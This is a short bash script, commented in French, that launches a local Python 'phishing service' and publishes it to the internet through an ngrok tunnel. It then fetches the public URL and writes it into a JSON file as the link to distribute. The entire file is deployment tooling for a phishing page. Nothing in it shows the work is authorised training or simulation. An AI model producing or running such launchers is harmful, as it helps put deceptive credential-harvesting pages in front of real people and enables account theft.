#!/bin/bash

# Répertoire du script
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PHISHING_LOG="$SCRIPT_DIR/phishing.log"

# Fichier JSON
OUTPUT_JSON="$SCRIPT_DIR/output.json"

# Chemin absolu vers le script Python
PYTHON_SCRIPT="$SCRIPT_DIR/../service/phishing_service/phishing.py"

# Démarre le serveur local en arrière-plan avec chemin absolu
python3 "$PYTHON_SCRIPT" > "$PHISHING_LOG" 2>&1 &

# Démarre ngrok en arrière-plan
ngrok http 5000 > /dev/null 2>&1 &

# Attendre que ngrok démarre
sleep 5

# Récupérer l'URL publique via l'API ngrok
URL=$(curl -s http://127.0.0.1:4040/api/tunnels | jq -r '.tunnels[0].public_url')

# Vérifier si l'URL a bien été récupérée
if [[ -z "$URL" || "$URL" == "null" ]]; then
    echo "❌ Impossible de récupérer l'URL ngrok."
    exit 1
fi

echo "✅ URL récupérée : $URL"

# Mise à jour du fichier JSON avec la nouvelle URL
jq --arg link "$URL" '.link = $link' "$OUTPUT_JSON" > "$OUTPUT_JSON.tmp" && mv "$OUTPUT_JSON.tmp" "$OUTPUT_JSON"

echo "✅ Fichier $OUTPUT_JSON mis à jour avec le lien."
